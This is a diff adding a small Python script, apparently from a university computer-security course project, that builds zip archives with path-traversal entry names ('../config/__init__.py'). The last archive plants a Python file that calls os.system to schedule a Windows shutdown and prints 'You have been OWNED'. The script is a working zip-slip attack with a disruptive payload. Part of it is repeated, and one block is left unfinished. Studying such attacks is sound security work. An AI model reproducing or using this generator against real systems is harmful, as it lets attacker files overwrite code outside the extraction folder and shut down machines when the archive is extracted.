@@ -1,0 +1,18 @@
+import zipfile
+z_info = zipfile.ZipInfo(r"../config/__init__.py")
+z_file = zipfile.ZipFile("C:\\Users\\faisa\\OneDrive\\Documents\\University of New Haven\\Courses\\2017-2018\\Fall 2017\\Intro to Computer Security\\Project\\bad_python_extract\\Malicious_test_file\\bad.zip", mode="w")
+z_file.writestr(z_info, "print('test')")
+z_info.external_attr = 0x10
+z_file.close()
+
+
+
+z_info = zipfile.ZipInfo(r"../config/If_this_there_not_good.py")
+z_file = zipfile.ZipFile("C:\\Users\\faisa\\OneDrive\\Documents\\University of New Haven\\Courses\\2017-2018\\Fall 2017\\Intro to Computer Security\\Project\\Malicious_test_file\\bad.zip", mode="w")
+
+import zipfile
+z_info = zipfile.ZipInfo(r"../config/__init__.py")
+z_file = zipfile.ZipFile("C:\\Users\\faisa\\OneDrive\\Documents\\University of New Haven\\Courses\\2017-2018\\Fall 2017\\Intro to Computer Security\\Project\\Malicious_test_file\\bad.zip", mode="w")
+z_file.writestr(z_info, 'import os' '\nos.system("shutdown /s /t 300")' '\nprint("You have been OWNED")' '\nprint("System Shutdown initiated!")')
+z_info.external_attr = 0x10
+z_file.close()
